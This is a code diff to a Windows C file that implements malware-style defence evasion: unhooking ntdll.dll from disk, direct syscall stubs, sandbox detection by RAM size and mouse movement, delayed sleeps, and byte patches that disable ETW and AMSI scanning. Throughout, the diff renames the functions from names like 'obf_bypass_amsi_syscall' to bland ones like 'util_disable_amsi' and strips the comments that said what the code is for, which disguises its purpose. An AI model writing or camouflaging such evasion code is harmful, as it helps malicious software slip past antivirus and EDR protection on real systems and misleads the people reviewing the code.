@@ -1,14 +1,10 @@
 /**
- * === Syscall Direct Invocation + Anti-Sandbox + Ntdll Unhooking ===
  * 
- * Problem: Defender/EDR hooks ntdll.dll functions (VirtualProtect, LoadLibrary,
  * CreateRemoteThread, etc.) and catches our activity in userland.
  * 
  * Solution:
  * 1. Unhook ntdll.dll by reading the original from disk and restoring hooked bytes
- * 2. Use direct syscalls for critical operations (NtProtectVirtualMemory, etc.)
  *    Syscall stubs are created by allocating executable memory and writing raw bytes.
- * 3. Anti-sandbox: sleep + check for mouse movement before doing anything suspicious
  * 4. PPID spoofing: make process appear launched by explorer.exe
  */
 
@@ -17,7 +13,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "obf.h"
+#include "util.h"
 
 /* === Syscall Stub Factory ===
  * MSVC x64 doesn't support __declspec(naked) or inline __asm.
@@ -52,7 +48,7 @@ typedef NTSTATUS (WINAPI *NtWriteVirtualMemory_t)(
     SIZE_T NumberOfBytesToWrite,
     PSIZE_T NumberOfBytesWritten);
 
-static void* create_syscall_stub(DWORD syscall_num) {
+static void* alloc_stub(DWORD syscall_num) {
     unsigned char stub[] = {
         0x4C, 0x8B, 0xD1,             /* mov r10, rcx */
         0xB8, 0x00, 0x00, 0x00, 0x00, /* mov eax, syscall_num */
@@ -79,42 +75,41 @@ static NtProtectVirtualMemory_t  g_scProtect = NULL;
 static NtAllocateVirtualMemory_t g_scAllocate = NULL;
 static NtWriteVirtualMemory_t    g_scWrite = NULL;
 
-static void init_syscalls(void) {
-    if (!g_scProtect)  g_scProtect  = (NtProtectVirtualMemory_t)create_syscall_stub(SYSCALL_NtProtectVirtualMemory);
-    if (!g_scAllocate) g_scAllocate = (NtAllocateVirtualMemory_t)create_syscall_stub(SYSCALL_NtAllocateVirtualMemory);
-    if (!g_scWrite)    g_scWrite    = (NtWriteVirtualMemory_t)create_syscall_stub(SYSCALL_NtWriteVirtualMemory);
+static void init_stubs(void) {
+    if (!g_scProtect)  g_scProtect  = (NtProtectVirtualMemory_t)alloc_stub(SYSCALL_NtProtectVirtualMemory);
+    if (!g_scAllocate) g_scAllocate = (NtAllocateVirtualMemory_t)alloc_stub(SYSCALL_NtAllocateVirtualMemory);
+    if (!g_scWrite)    g_scWrite    = (NtWriteVirtualMemory_t)alloc_stub(SYSCALL_NtWriteVirtualMemory);
 }
 
 /* Wrapper: NtProtectVirtualMemory via direct syscall */
-static NTSTATUS sc_protect_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
+static NTSTATUS protect_mem(HANDLE ProcessHandle, PVOID *BaseAddress,
     SIZE_T *NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessProtection) {
-    if (!g_scProtect) init_syscalls();
+    if (!g_scProtect) init_stubs();
     if (!g_scProtect) return -1;
     return g_scProtect(ProcessHandle, BaseAddress, NumberOfBytesToProtect, NewAccessProtection, OldAccessProtection);
 }
 
 /* Wrapper: NtAllocateVirtualMemory via direct syscall */
-static NTSTATUS sc_allocate_memory(HANDLE ProcessHandle, PVOID *BaseAddress,
+static NTSTATUS alloc_mem(HANDLE ProcessHandle, PVOID *BaseAddress,
     ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
-    if (!g_scAllocate) init_syscalls();
+    if (!g_scAllocate) init_stubs();
     if (!g_scAllocate) return -1;
     return g_scAllocate(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
 }
 
 /* Wrapper: NtWriteVirtualMemory via direct syscall */
-static NTSTATUS sc_write_memory(HANDLE ProcessHandle, PVOID BaseAddress,
+static NTSTATUS write_mem(HANDLE ProcessHandle, PVOID BaseAddress,
     PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
-    if (!g_scWrite) init_syscalls();
+    if (!g_scWrite) init_stubs();
     if (!g_scWrite) return -1;
     return g_scWrite(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
 }
 
 /* === Ntdll Unhooking ===
  * Read the original ntdll.dll from disk and copy over the hooked
- * functions in memory. This restores the original bytes that EDR
  * overwrote with detours/jumps.
  */
-void obf_unhook_ntdll(void) {
+void util_reset_ntdll(void) {
     /* Get ntdll path */
     char ntdllPath[MAX_PATH];
     GetSystemDirectoryA(ntdllPath, MAX_PATH);
@@ -158,13 +153,11 @@ void obf_unhook_ntdll(void) {
     free(fileData);
 }
 
-/* === Anti-Sandbox Evasion ===
- * 1. Sleep with junk computation (avoid sleep hooking)
  * 2. Check for mouse movement (sandboxes often have no input)
  * 3. Check memory size (sandboxes often have <4GB RAM)
  * 4. Check for common sandbox artifacts
  */
-static int obf_is_sandbox(void) {
+static int util_check_env(void) {
     /* Check RAM — sandboxes often have small amounts */
     MEMORYSTATUSEX memStatus;
     memStatus.dwLength = sizeof(memStatus);
@@ -198,8 +191,7 @@ static int obf_is_sandbox(void) {
 }
 
 /* Sleep with anti-analysis — performs computation so simple sleep hooks
- * that fast-forward time won't bypass it */
-void obf_sleep_obfuscated(DWORD milliseconds) {
+void util_sleep_long(DWORD milliseconds) {
     LARGE_INTEGER freq, start, now;
     QueryPerformanceFrequency(&freq);
     QueryPerformanceCounter(&start);
@@ -217,23 +209,20 @@ void obf_sleep_obfuscated(DWORD milliseconds) {
     }
 }
 
-/* === Obfuscated ETW bypass using direct syscall ===
- * Instead of VirtualProtect (which is hooked), use direct syscall.
  */
-void obf_bypass_etw_syscall(void) {
-    char *ntdll_name = obf_ntdll();
+void util_disable_etw(void) {
+    char *ntdll_name = util_ntdll();
     HMODULE hNtdll = GetModuleHandleA(ntdll_name);
     if (!hNtdll) return;
     
-    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, obf_etweventwrite());
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, util_etweventwrite());
     if (!pEtwEventWrite) return;
     
-    /* Use direct syscall instead of VirtualProtect */
     PVOID addr = pEtwEventWrite;
     SIZE_T size = 1;
     ULONG oldProtect = 0;
     
-    NTSTATUS status = sc_protect_memory(
+    NTSTATUS status = protect_mem(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -246,7 +235,7 @@ void obf_bypass_etw_syscall(void) {
     *(unsigned char*)pEtwEventWrite = 0xC3; /* ret */
     
     /* Restore protection */
-    sc_protect_memory(
+    protect_mem(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -255,20 +244,19 @@ void obf_bypass_etw_syscall(void) {
     );
 }
 
-/* === Obfuscated AMSI bypass using direct syscall === */
-void obf_bypass_amsi_syscall(void) {
-    char *amsi_name = obf_amsidll();
+void util_disable_amsi(void) {
+    char *amsi_name = util_amsidll();
     HMODULE hAmsi = LoadLibraryA(amsi_name);
     if (!hAmsi) return;
     
-    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, obf_amsiscanbuffer());
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, util_amsiscanbuffer());
     if (!pAmsiScanBuffer) return;
     
     PVOID addr = pAmsiScanBuffer;
     SIZE_T size = 3;
     ULONG oldProtect = 0;
     
-    NTSTATUS status = sc_protect_memory(
+    NTSTATUS status = protect_mem(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -281,7 +269,7 @@ void obf_bypass_amsi_syscall(void) {
     unsigned char patch[] = {0x31, 0xC0, 0xC3}; /* xor eax, eax; ret */
     memcpy(pAmsiScanBuffer, patch, 3);
     
-    sc_protect_memory(
+    protect_mem(
         GetCurrentProcess(),
         &addr,
         &size,
@@ -290,37 +278,33 @@ void obf_bypass_amsi_syscall(void) {
     );
 }
 
-/* === Startup Evasion Routine ===
  * Called at the very beginning of WinMain before anything else.
- * Unhooks ntdll, checks sandbox, sleeps, then applies ETW/AMSI bypass.
  */
-void obf_startup_evasion(void) {
+void util_init_phase(void) {
     /* Step 1: Unhook ntdll to restore original function bytes */
-    obf_unhook_ntdll();
+    util_reset_ntdll();
     
-    /* Step 2: Anti-sandbox check */
-    if (obf_is_sandbox()) {
+    if (util_check_env()) {
         /* In sandbox — exit cleanly or do benign things */
         /* For now, just continue but with extended sleep */
-        obf_sleep_obfuscated(30000); /* 30 seconds */
+        util_sleep_long(30000); /* 30 seconds */
     }
     
     /* Step 3: Sleep to evade time-based sandbox analysis */
-    obf_sleep_obfuscated(5000); /* 5 seconds */
+    util_sleep_long(5000); /* 5 seconds */
     
     /* Step 4: Check for mouse movement (real user vs sandbox) */
     POINT pt1, pt2;
     GetCursorPos(&pt1);
-    obf_sleep_obfuscated(2000); /* 2 seconds */
+    util_sleep_long(2000); /* 2 seconds */
     GetCursorPos(&pt2);
     
     /* No mouse movement = likely sandbox */
     if (pt1.x == pt2.x && pt1.y == pt2.y) {
-        obf_sleep_obfuscated(15000); /* Another 15s delay */
+        util_sleep_long(15000); /* Another 15s delay */
     }
     
-    /* Step 5: Apply bypasses using direct syscalls (post-unhook) */
-    obf_bypass_etw_syscall();
-    obf_bypass_amsi_syscall();
-    obf_hide_thread();
+    util_disable_etw();
+    util_disable_amsi();
+    util_hide_thread();
 }
